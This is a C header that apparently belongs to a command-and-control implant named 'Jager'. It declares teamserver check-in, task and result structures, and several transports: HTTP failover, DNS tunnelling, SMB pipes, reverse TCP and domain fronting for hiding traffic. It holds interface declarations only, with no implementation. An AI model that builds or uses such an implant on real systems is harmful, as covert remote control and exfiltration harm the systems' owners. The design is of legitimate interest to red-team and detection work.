#ifndef JAGER_TRANSPORT_H
#define JAGER_TRANSPORT_H

#include <windows.h>
#include <winhttp.h>
#include <winsock2.h>
#include "config.h"

// HTTP response buffer
typedef struct _HTTP_RESPONSE {
    BYTE  *data;
    DWORD  size;
    DWORD  status_code;
} HTTP_RESPONSE, *PHTTP_RESPONSE;

// Task received from teamserver
typedef struct _C2_TASK {
    char   id[64];
    DWORD  type;
    BYTE  *data;
    DWORD  data_size;
} C2_TASK, *PC2_TASK;

// Task result to send back
typedef struct _C2_RESULT {
    char   task_id[64];
    BYTE  *data;
    DWORD  data_size;
    char   error[256];
} C2_RESULT, *PC2_RESULT;

// Failover URL list
#define MAX_C2_URLS 8

typedef struct {
    char urls[MAX_C2_URLS][512];
    int count;
    int current;
    int fail_count;
    int max_fails;
} C2_FAILOVER;

// DNS transport configuration
typedef struct {
    char domain[256];
    char ns_server[64];
    DWORD chunk_size;
} DNS_TRANSPORT_CONFIG;

// SMB pipe transport
typedef struct {
    char pipe_name[256];
    HANDLE pipe_handle;
    BOOL is_server;
} SMB_TRANSPORT;

// Raw TCP transport
typedef struct {
    SOCKET sock;
    BOOL is_bind;
    char host[256];
    WORD port;
} TCP_TRANSPORT;

// Domain fronting configuration
typedef struct {
    char cdn_host[256];
    char actual_host[256];
    BOOL enabled;
} DOMAIN_FRONT_CONFIG;

// Core transport interface
BOOL transport_init(PIMPLANT_CONFIG config);
BOOL transport_register(PIMPLANT_CONFIG config);
BOOL transport_checkin(PIMPLANT_CONFIG config, PC2_TASK *tasks, DWORD *task_count);
DWORD transport_parse_tasks(const char *json, DWORD json_len, PC2_TASK *out_tasks);
BOOL transport_send_result(PIMPLANT_CONFIG config, PC2_RESULT result);
void transport_cleanup(void);

/* Return active session AES key for P2P frame HMAC (requires initialized session) */
BOOL transport_get_session_key(BYTE *key_out, DWORD key_len);

// HTTP helpers
PHTTP_RESPONSE http_post(const char *url, const char *path, const BYTE *data, DWORD data_size, const char *user_agent);
PHTTP_RESPONSE http_get(const char *url, const char *path, const char *user_agent);
void http_response_free(PHTTP_RESPONSE resp);

// Failover
void failover_init(C2_FAILOVER *fo, const char *url_list);
const char *failover_get_url(C2_FAILOVER *fo);
void failover_mark_success(C2_FAILOVER *fo);
void failover_mark_failure(C2_FAILOVER *fo);

// DNS transport
BOOL dns_transport_send(DNS_TRANSPORT_CONFIG *cfg, const char *session_id,
                        const BYTE *data, DWORD data_len);
BOOL dns_transport_recv(DNS_TRANSPORT_CONFIG *cfg, const char *session_id,
                        BYTE **out_data, DWORD *out_len);
BOOL dns_transport_send_typed(DNS_TRANSPORT_CONFIG *cfg, const char *session_id,
                              const char *msg_type, const BYTE *data, DWORD data_len);

// SMB transport
BOOL smb_transport_listen(SMB_TRANSPORT *t, const char *pipe_name);
BOOL smb_transport_connect(SMB_TRANSPORT *t, const char *host, const char *pipe_name);
BOOL smb_transport_send(SMB_TRANSPORT *t, const BYTE *data, DWORD data_len);
BOOL smb_transport_recv(SMB_TRANSPORT *t, BYTE **out_data, DWORD *out_len);
void smb_transport_close(SMB_TRANSPORT *t);

// TCP transport
BOOL tcp_transport_bind(TCP_TRANSPORT *t, const char *bind_addr, WORD port);
BOOL tcp_transport_reverse(TCP_TRANSPORT *t, const char *host, WORD port);
BOOL tcp_transport_send(TCP_TRANSPORT *t, const BYTE *data, DWORD data_len);
BOOL tcp_transport_recv(TCP_TRANSPORT *t, BYTE **out_data, DWORD *out_len);
void tcp_transport_close(TCP_TRANSPORT *t);

// Domain fronting
BOOL domain_front_init(DOMAIN_FRONT_CONFIG *cfg, const char *cdn_host, const char *actual_host);
BOOL domain_front_apply(HINTERNET hRequest, DOMAIN_FRONT_CONFIG *cfg);
const char *domain_front_connect_host(DOMAIN_FRONT_CONFIG *cfg, const char *url_host);

#endif // JAGER_TRANSPORT_H
